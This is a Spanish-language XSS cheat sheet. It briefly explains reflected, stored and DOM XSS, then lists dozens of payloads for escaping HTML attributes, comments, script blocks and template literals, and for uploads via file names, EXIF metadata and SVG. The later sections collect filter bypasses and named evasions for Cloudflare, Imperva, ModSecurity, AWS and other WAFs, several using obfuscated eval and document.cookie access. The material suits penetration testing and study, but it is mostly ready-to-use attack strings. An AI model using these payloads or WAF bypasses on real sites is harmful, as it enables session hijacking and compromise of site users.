# XSS Cheat Sheet

Los ataques Cross-Site Scripting (XSS) son un tipo de inyección en el que se inyectan scripts maliciosos en los sitios web. Esta vulnerabilidad puede aparecer en todas las funciones de la aplicación. Si desea encontrar XSS basado en Dom, puede encontrarlo leyendo el código fuente de JavaScript 

## Hay 3 tipos de ataques XSS

- Reflected XSS

     Ataque donde se ejecuta el script malicioso desde otro sitio web a través del navegador web 
     
- Stored XSS

     Los ataques almacenados son aquellos en los que el script inyectado se almacena de forma permanente en los servidores de destino     
     
- DOM-Based XSS

     Un tipo de XSS que tiene cargas útiles que se encuentran en el DOM en lugar de dentro del código HTML    
     
          
# Explotando 

1 - Carga útil básica 

```html    
<script>alert(1)</script>
<svg/onload=alert(1)>
<img src=x onerror=alert(1)>
```      

2 - Agregue ' o " para escapar de la carga útil del valor de una etiqueta HTML

```html
"><script>alert(1)</script>
'><script>alert(1)</script> 
```
    
- Ejemplo de código fuente 

```html
<input id="keyword" type="text" name="q" value="REFLECTED_HERE">
```

- Después de ingresar la carga útil

```html
<input id="keyword" type="text" name="q" value=""><script>alert(1)</script>
```

3 - Agregue --> para escapar de la carga útil si la entrada aterriza en comentarios HTML

```html
--><script>alert(1)</script>
```

- Ejemplo de código fuente 

```html
<!-- REFLECTED_HERE --> 
```

- Después de ingresar la carga útil 

```html
<!-- --><script>alert(1)</script> -->
```

4 - Agregar cuando la entrada dentro o entre las etiquetas de apertura/cierre, la etiqueta puede ser ```<a>,<title>,<script>``` y cualquier otra etiqueta HTML 

```html
</tag><script>alert(1)</script>
"></tag><script>alert(1)</script>
```

- Ejemplo de código fuente 

```html
<a href="https://target.com/1?status=REFLECTED_HERE">1</a>
```

- Después de ingresar la carga útil 

```html
<a href="https://target.com/1?status="></a><script>alert(1)</script>">1</a>
```

5 - Se usa cuando se ingresa dentro del valor de un atributo de una etiqueta HTML pero > está filtrado 

    " onmouseover=alert(1)
    " autofocus onfocus=alert(1)
    
- Ejemplo de código fuente 

```html
<input id="keyword" type="text" name="q" value="REFLECTED_HERE">  
```

- Después de ingresar la carga útil 

```html
<input id="keyword" type="text" name="q" value="" onmouseover=alert(1)">
```

6 - Use </script> cuando ingrese dentro etiquetas ```<script>```

```html
</script><script>alert(1)</script>
```

- Ejemplo de código fuente 

```html
<script>
    var sitekey = 'REFLECTED_HERE';
</script>
```

- Después de ingresar la carga útil 

```html
<script>
    var sitekey = '</script><script>alert(1)</script>';
</script>
```

7 - Se usa cuando la entrada aterriza en un bloque de script, dentro de un valor delimitado por una cadena

    '-alert(1)-'
    '/alert(1)//
    
- Ejemplo de código fuente 

```html
<script>
    var sitekey = 'REFLECTED_HERE';
</script>
```

- Después de ingresar la carga útil 

```html
<script>
    var sitekey = ''-alert(1)-'';
</script>
```

8 - Igual que el Número 7. Pero dentro de un valor delimitado por una cadena, pero las comillas se escapan con una barra invertida

    \'alert(1)//
    
- Ejemplo de código fuente 

```html
<script>
    var sitekey = 'REFLECTED_HERE';
</script>
```

- Si ingresamos el payload '-alert(1)-' será así 

```html
<script>
    var sitekey = '\'-alert(1)-\'';
</script>
```

Las comillas se escapan con una barra invertida, por lo que debemos bypassear

- Después de ingresar la carga útil 

```html
<script>
    var sitekey = '\\'alert(1)//';
</script>
```

9 - Úselo cuando haya múltiples reflejos en la misma línea de código JS 

    /alert(1)//\
    /alert(1)}//\
    
- Ejemplo de código fuente 

```html
<script>
    var a = 'REFLECTED_HERE'; var b = 'REFLECTED_HERE';
</script>  
```

- Después de ingresar la carga útil 

```html
<script>
    var a = '/alert(1)//\'; var b = '/alert(1)//\';
</script>
```

10 - Se usa cuando se ingresa dentro de un valor delimitado por una cadena y dentro de un solo bloque lógico como función o condicional (if, else, etc.)

    '}alert(1);{'
    \'}alert(1);{// 
    
- Ejemplo de código fuente 

```html
<script>
    var greeting;
    var time = 1;
    if (time < 10) {
    test = 'REFLECTED_HERE';
  }
</script>   
```

- Después de ingresar la carga útil 

```html
<script>
    var test;
    var time = 1;
    if (time < 10) {
    test = ''}alert(1);{'';
  }
</script>
```

La carga útil número 2 se usa cuando la cotización escapa por barra invertida

11 - Usar cuando la entrada cae dentro de cadenas delimitadas por acentos graves

    ${alert(1)}
    
- Ejemplo de código fuente 

```html
<script>
    var dapos = `REFLECTED_HERE`;
</script>
```

- Después de ingresar la carga útil 

```html
<script>
    var dapos = `${alert(1)}`;
</script>
```

12 - Se utiliza cuando hay varios reflejos en la misma página. (Doble reflejo) 

```html
'onload=alert(1)><svg/1='
'>alert(1)</script><script/1='
*/alert(1)</script><script>/*
```

- Después de ingresar la carga útil 

```html
<!DOCTYPE html>
<html>
<body>
'onload=alert(1)><svg/1='
...
'onload=alert(1)><svg/1='
</body>
</html>
```

13 - Se utiliza cuando hay varios reflejos en la misma página. (Triple Reflexión) 

```html
*/alert(1)">'onload="/*<svg/1='
`-alert(1)">'onload="`<svg/1='
*/</script>'>alert(1)/*<script/1='
```

- Después de ingresar la carga útil 

```html
<!DOCTYPE html>
<html>
<body>
*/alert(1)">'onload="/*<svg/1='
...
*/alert(1)">'onload="/*<svg/1='
...
*/alert(1)">'onload="/*<svg/1='
</body>
</html>
```

14 - XSS en nombre de archivo (Carga de archivo) Se usa cuando el nombre del archivo cargado se refleja en algún lugar de la página de destino 

    "><svg onload=alert(1)>.jpeg
    
15 - XSS en metadatos (carga de archivos) Se usa cuando los metadatos cargados se reflejan en algún lugar de la página de destino (usando exiftool) 

    $ exiftool -Artist='"><script>alert(1)</script>' xss.jpeg
    
16 - XSS con archivo SVG (carga de archivo) 

    <svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
    
17 - XSS via markdown

    [Click Me](javascript:alert('1'))
    
18 - XSS en página XML     

    <a:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</a:script>
    
Agregue un "-->" a la carga útil si la entrada aterriza en una sección de comentarios 

Agregue un "]]>" si la entrada cae en una sección CDATA 


# XSS Cheat Sheet (Bypass)

19 - Caso mixto 

```html
<Script>alert(document.cookie)</Script> 
```

20 - Etiquetas abiertas 

```html
<svg onload="alert(1)"
```

21 - Cargas útiles en mayúsculas 

```html
<SVG ONLOAD=ALERT(1)>
```

22 - XSS Codificado

    (Encoded)
    %3Csvg%20onload%3Dalert(1)%3E 

    (Double Encoded)
    %253Csvg%2520onload%253Dalert%281%29%253E 

    (Triple Encoded)
    %25253Csvg%252520onload%25253Dalert%25281%2529%25253E 
    
23 - Entrada minúscula JS 

```html
<SCRİPT>alert(1)</SCRİPT>
```

24 - Bypass de validación de correo electrónico de PHP

```html
<svg/onload=alert(1)>"@gmail.com
```

25 - Bypass de validación de URL de PHP 

    javascript://%250Aalert(1)
    
26 - Bypass de comentarios internos

```html
<!--><svg onload=alert(1)-->
```

# Bypass WAF

1 - Cloudflare

```html
<svg%0Aonauxclick=0;[1].some(confirm)//

<svg/onload={alert`1`}>

<a/href=j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(1)&rpar;>

"><img%20src=x%20onmouseover=prompt%26%2300000000000000000040;document.cookie%26%2300000000000000000041;

"><onx=[] onmouseover=prompt(1)>

%2sscript%2ualert()%2s/script%2u

"Onx=() onMouSeoVer=prompt(1)>"Onx=[] onMouSeoVer=prompt(1)>"/*/Onx=""//onfocus=prompt(1)>"//Onx=""/*/%01onfocus=prompt(1)>"%01onClick=prompt(1)>"%2501onclick=prompt(1)>"onClick="(prompt)(1)"Onclick="(prompt(1))"OnCliCk="(prompt`1`)"Onclick="([1].map(confirm))

[1].map(confirm)'ale'+'rt'()a&Tab;l&Tab;e&Tab;r&Tab;t(1)prompt&lpar;1&rpar;prompt&#40;1&#41;prompt%26%2300000000000000000040;1%26%2300000000000000000041;(prompt())(prompt``)

<svg onload=alert%26%230000000040"1")>

<svg onload=prompt%26%230000000040document.domain)>

<svg onload=prompt%26%23x000000028;document.domain)>

<svg/onrandom=random onload=confirm(1)>

<video onnull=null onmouseover=confirm(1)>

<a id=x tabindex=1 onbeforedeactivate=print(`XSS`)></a><input autofocus>

<img ignored=() src=x onerror=prompt(1)>

<svg onx=() onload=(confirm)(1)>

<--`<img/src=` onerror=confirm``> --!>

<img src=x onerror="a=()=>{c=0;for(i in self){if(/^a[rel]+t$/.test(i)){return c}c++}};self[Object.keys(self)[a()]](document.domain)">

<j id=x style="-webkit-user-modify:read-write" onfocus={window.onerror=eval}throw/0/+name>H</j>#x

'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>

'"><img/src/onerror=.1|alert``>

:javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.cookie

Function("\x61\x6c\x65\x72\x74\x28\x31\x29")();
```

2 - Cloudfront

```html
">%0D%0A%0D%0A<x '="foo"><x foo='><img src=x onerror=javascript:alert(`cloudfrontbypass`)//'>

<--`<img%2fsrc%3d` onerror%3dalert(document.domain)> --!>

"><--<img+src= "><svg/onload+alert(document.domain)>> --!>
```  

3 - Cloudbric

```html
<a69/onclick=[1].findIndex(alert)>pew
```

4 - Comodo WAF

```html
<input/oninput='new Function`confir\u006d\`0\``'>

<p/ondragstart=%27confirm(0)%27.replace(/.+/,eval)%20draggable=True>dragme
```

5 - ModSecurity

```html
<a href="jav%0Dascript&colon;alert(1)">
```

6 - Imperva

```html
<input id='a'value='global'><input id='b'value='E'><input 'id='c'value='val'><input id='d'value='aler'><input id='e'value='t(documen'><input id='f'value='t.domain)'><svg+onload[\r\n]=$[a.value+b.value+c.value](d.value+e.value+f.value)>

<x/onclick=globalThis&lsqb;'\u0070r\u006f'+'mpt']&lt;)>clickme

<a/href="j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)" />click

<a69/onclick=write&lpar;&rpar;>pew

<details/ontoggle="self['wind'%2b'ow']['one'%2b'rror']=self['wind'%2b'ow']['ale'%2b'rt'];throw/**/self['doc'%2b'ument']['domain'];"/open>

<svg onload\r\n=$.globalEval("al"+"ert()");>

<svg/onload=self[`aler`%2b`t`]`1`>

%3Cimg%2Fsrc%3D%22x%22%2Fonerror%3D%22prom%5Cu0070t%2526%2523x28%3B%2526%2523x27%3B%2526%2523x58%3B%2526%2523x53%3B%2526%2523x53%3B%2526%2523x27%3B%2526%2523x29%3B%22%3E

<iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';>

<img/src=q onerror='new Function`al\ert\`1\``'>

<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
```

7 - AWS

```html
<script>eval(atob(decodeURIComponent(confirm`1`)))</script>
```
